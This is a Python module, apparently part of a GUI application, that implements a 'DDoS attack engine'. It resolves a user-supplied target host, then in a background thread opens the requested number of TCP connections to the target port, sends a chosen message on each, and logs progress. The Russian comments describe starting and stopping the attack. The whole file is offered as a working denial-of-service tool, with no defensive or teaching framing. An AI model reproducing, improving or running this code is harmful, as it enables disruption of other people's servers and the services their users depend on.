"""
Attack engine for DDoS functionality
"""

import socket
import threading
import time

class AttackEngine:
    def __init__(self, app):
        self.app = app
        self.attack_running = False
        self.connections = 0
        self.attack_thread = None
    
    def start_attack(self):
        """Начать DDoS атаку"""
        if self.attack_running:
            return
        
        # Получение значений через callback'и
        host = self.app.get_host()
        port = self.app.get_port()
        message = self.app.get_message()
        conn = self.app.get_connections()
        
        # Валидация
        if not all([host, port, message, conn]):
            self.app.show_error("❌ Please fill all fields")
            return
        
        try:
            port = int(port)
            conn = int(conn)
            if port <= 0 or port > 65535:
                raise ValueError
            if conn <= 0:
                raise ValueError
        except ValueError:
            self.app.show_error("❌ Invalid port or connections value")
            return
        
        # Разрешение хоста
        try:
            ip = socket.gethostbyname(host)
            self.app.log_message(f"✅ Target resolved: {host} → {ip}")
        except socket.gaierror:
            self.app.show_error("❌ Cannot resolve hostname")
            return
        
        self.attack_running = True
        self.app.on_attack_start()
        
        # Запуск атаки в отдельном потоке
        self.attack_thread = threading.Thread(
            target=self.run_attack,
            args=(host, port, message, conn, ip),
            daemon=True
        )
        self.attack_thread.start()
    
    def run_attack(self, host, port, message, conn, ip):
        """Запуск атаки"""
        self.app.log_message(f"🔥 Starting attack on {host} ({ip}:{port})")
        self.app.log_message(f"🔗 Making {conn} connections...")
        
        self.connections = 0
        
        for i in range(conn):
            if not self.attack_running:
                break
                
            try:
                # Создание сокета и отправка данных
                ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ddos.settimeout(3)
                ddos.connect((host, port))
                ddos.send(message.encode())
                self.connections += 1
                
                # Обновление прогресса
                progress = (self.connections / conn) * 100
                self.app.update_progress(progress)
                
                if self.connections % 10 == 0:
                    self.app.log_message(f"📈 Made {self.connections}/{conn} connections")
                
                ddos.close()
                time.sleep(0.05)
                
            except socket.error as msg:
                self.app.log_message(f"❌ Connection failed: {msg}")
            except Exception as e:
                self.app.log_message(f"⚠️ Error: {e}")
        
        self.attack_running = False
        self.app.on_attack_finished(self.connections)
    
    def stop_attack(self):
        """Остановка атаки"""
        self.attack_running = False
        self.app.log_message("⏹️ Stopping attack...")
        self.app.on_attack_stop()